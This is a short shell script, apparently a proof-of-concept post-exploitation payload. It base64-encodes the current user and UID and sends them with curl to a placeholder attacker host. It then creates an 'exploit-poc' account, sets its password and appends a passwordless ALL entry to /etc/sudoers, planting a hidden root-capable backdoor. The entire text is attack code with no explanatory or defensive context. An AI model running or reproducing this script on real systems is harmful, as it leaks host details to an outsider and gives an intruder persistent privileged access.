#!/bin/sh
set -e  # Enable strict error checking

# Report back current user and privilege level
CURRENT_USER=$(whoami | base64)
PRIV_LEVEL=$(id -u | base64)

curl http://<attacker_IP>/poc?user=$CURRENT_USER
curl http://<attacker_IP>/poc?priv=$PRIV_LEVEL

# Create a new root user
if ! useradd -s /bin/sh -m exploit-poc; then
  echo "Failed to add user 'exploit-poc'" >&2
  exit 1
fi

echo "exploit-poc:<redacted_password>" | chpasswd

# Grant root privileges
if ! echo "exploit-poc ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers; then
  echo "Failed to modify sudoers file" >&2
  exit 1
fi

exit 0
